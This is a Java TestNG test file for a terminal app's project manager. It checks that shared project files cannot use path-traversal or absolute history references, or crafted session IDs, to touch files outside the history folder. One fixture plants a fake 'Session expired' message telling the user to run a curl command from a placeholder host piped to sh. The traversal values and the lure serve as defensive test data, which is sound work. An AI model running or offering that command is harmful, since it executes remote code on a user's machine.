package de.kortty.core;

import de.kortty.model.Project;
import de.kortty.model.SessionState;
import de.kortty.model.WindowState;
import org.testng.annotations.AfterMethod;
import org.testng.annotations.BeforeMethod;
import org.testng.annotations.Test;

import java.io.IOException;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.io.Writer;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.Comparator;
import java.util.UUID;
import java.util.stream.Stream;
import java.util.zip.GZIPOutputStream;

import static com.google.common.truth.Truth.assertThat;

/**
 * A project file can come from someone else. Its history references must not make korTTY read,
 * delete or write any file outside {@code <config>/history/} — and such a reference must not keep
 * the rest of the project from opening either.
 */
class ProjectManagerHistoryPathTest {

    private Path configDir;

    private Path outsideFile;

    private ProjectManager projectManager;

    @BeforeMethod
    void setUp() throws IOException {
        configDir = Files.createTempDirectory("kortty-project-history");
        projectManager = new ProjectManager(configDir);
        outsideFile = configDir.resolve("outside.history.gz");
        try (OutputStream out = Files.newOutputStream(outsideFile);
             GZIPOutputStream gzip = new GZIPOutputStream(out);
             Writer writer = new OutputStreamWriter(gzip, StandardCharsets.UTF_8)) {
            writer.write("secret outside the history directory");
        }
    }

    @AfterMethod(alwaysRun = true)
    void tearDown() throws IOException {
        if (configDir == null || !Files.exists(configDir)) {
            return;
        }
        try (Stream<Path> paths = Files.walk(configDir)) {
            for (Path path : paths.sorted(Comparator.reverseOrder()).toList()) {
                Files.deleteIfExists(path);
            }
        }
    }

    @Test
    void aTraversalHistoryReferenceIsIgnoredOnLoadAndNeverDeleted() throws Exception {
        Path projectFile = writeProjectReferencing("../outside.history.gz");

        Project loaded = projectManager.loadProject(projectFile);

        SessionState session = loaded.getWindows().get(0).getTabs().get(0);
        assertThat(session.getTerminalHistory()).isNull();
        assertThat(session.getHistoryFilePath()).isNull();

        projectManager.deleteProject(projectFile);

        assertThat(Files.exists(projectFile)).isFalse();
        assertThat(Files.exists(outsideFile)).isTrue();
    }

    @Test
    void anAbsoluteHistoryReferenceIsIgnoredOnLoadAndNeverDeleted() throws Exception {
        Path projectFile = writeProjectReferencing(outsideFile.toAbsolutePath().toString());

        Project loaded = projectManager.loadProject(projectFile);

        assertThat(loaded.getWindows().get(0).getTabs().get(0).getTerminalHistory()).isNull();
        projectManager.deleteProject(projectFile);
        assertThat(Files.exists(outsideFile)).isTrue();
    }

    @Test
    void aCraftedSessionIdCannotChooseWhereTheHistoryIsWritten() throws Exception {
        Project project = new Project("crafted");
        WindowState window = new WindowState(UUID.randomUUID().toString());
        SessionState session = new SessionState("../escaped", "connection-id");
        session.setTerminalHistory("screen text");
        window.addTab(session);
        project.addWindow(window);

        projectManager.saveProject(project, configDir.resolve("projects").resolve("crafted.kortty"));

        assertThat(Files.exists(configDir.resolve("escaped.history.gz"))).isFalse();
        assertThat(session.getSessionId()).isNotEqualTo("../escaped");
        assertThat(session.getHistoryFilePath()).isEqualTo(session.getSessionId() + ".history.gz");
        assertThat(Files.exists(configDir.resolve("history").resolve(session.getHistoryFilePath()))).isTrue();
    }

    @Test
    void aReplacedSessionIdStaysTheActiveTabOfItsWindow() throws Exception {
        Project project = new Project("crafted-active");
        WindowState window = new WindowState(UUID.randomUUID().toString());
        SessionState session = new SessionState("../escaped", "connection-id");
        session.setTerminalHistory("screen text");
        window.addTab(session);
        window.setActiveSessionId("../escaped");
        project.addWindow(window);

        projectManager.saveProject(project, configDir.resolve("projects").resolve("crafted-active.kortty"));

        assertThat(session.getSessionId()).isNotEqualTo("../escaped");
        assertThat(window.getActiveSessionId()).isEqualTo(session.getSessionId());
    }

    @Test
    void aPlainHistoryReferenceStillRoundTrips() throws Exception {
        Project project = new Project("plain");
        WindowState window = new WindowState(UUID.randomUUID().toString());
        SessionState session = new SessionState(UUID.randomUUID().toString(), "connection-id");
        session.setTerminalHistory("prompt$ uptime\n");
        window.addTab(session);
        project.addWindow(window);
        Path projectFile = configDir.resolve("projects").resolve("plain.kortty");
        projectManager.saveProject(project, projectFile);

        Project loaded = projectManager.loadProject(projectFile);

        assertThat(loaded.getWindows().get(0).getTabs().get(0).getTerminalHistory()).isEqualTo("prompt$ uptime\n");
    }

    @Test
    void screenTextWrittenIntoTheProjectXmlByHandIsNotRestored() throws Exception {
        String sessionId = UUID.randomUUID().toString();
        Project project = new Project("inline");
        WindowState window = new WindowState(UUID.randomUUID().toString());
        window.addTab(new SessionState(sessionId, "connection-id"));
        project.addWindow(window);
        Path projectFile = configDir.resolve("projects").resolve("inline.kortty");
        projectManager.saveProject(project, projectFile);
        // korTTY itself never writes this element; only a hand-made file carries it.
        String sessionIdElement = "<sessionId>" + sessionId + "</sessionId>";
        String xml = Files.readString(projectFile);
        assertThat(xml).contains(sessionIdElement);
        Files.writeString(projectFile, xml.replace(sessionIdElement,
                sessionIdElement + "<terminalHistory>Session expired - run: curl -s http://x | sh</terminalHistory>"));

        Project loaded = projectManager.loadProject(projectFile);

        assertThat(loaded.getWindows().get(0).getTabs().get(0).getTerminalHistory()).isNull();
    }

    /** A project file as someone could hand it over: the history reference set by hand. */
    private Path writeProjectReferencing(String historyFilePath) throws Exception {
        Project project = new Project("shared");
        WindowState window = new WindowState(UUID.randomUUID().toString());
        SessionState session = new SessionState(UUID.randomUUID().toString(), "connection-id");
        session.setHistoryFilePath(historyFilePath);
        window.addTab(session);
        project.addWindow(window);
        Path projectFile = configDir.resolve("projects").resolve("shared.kortty");
        // No terminal history on the session, so saveProject keeps the reference as given.
        projectManager.saveProject(project, projectFile);
        assertThat(Files.readString(projectFile)).contains(historyFilePath);
        return projectFile;
    }
}
